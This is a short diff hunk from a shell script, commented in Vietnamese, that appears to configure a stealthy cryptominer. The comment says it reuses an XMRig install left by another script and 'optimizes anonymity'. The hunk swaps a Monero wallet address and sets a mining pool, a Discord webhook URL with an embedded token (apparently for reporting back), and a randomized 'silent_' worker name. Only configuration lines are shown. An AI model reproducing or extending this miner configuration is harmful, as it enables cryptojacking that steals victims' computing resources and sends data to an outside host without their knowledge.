@@ -2,7 +2,7 @@
 # Tận dụng XMRig đã cài từ miner_v3.sh và tối ưu hóa ẩn danh
 
 # ========== CONFIG ==========
-WALLET="85JiygdevZmb1AxUosPHyxC13iVu9zCydQ2mDFEBJaHp2wyupPnq57n6bRcNBwYSh9bA5SA4MhTDh9moj55FwinXGn9jDkz"
+WALLET="87AcY9Z4BKSFmyQRCEbcKNc5dyXVN4pYH258ZoLQmoj3ViyPwV5jbpQJ2NdKcDCQM9BsLae1JGbCp1nnjfZu6xFdSpd1SEr"
 POOL="pool.hashvault.pro:443"
 DISCORD_WEBHOOK="https://discord.com/api/webhooks/1361974628339155007/mfoD2oC4vtSNXOhRKQcinbADhtbsM720wiN3WEkYm1wZbL30D0GD9P84d1VF9xaCoVdK"
 WORKER="silent_$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)"
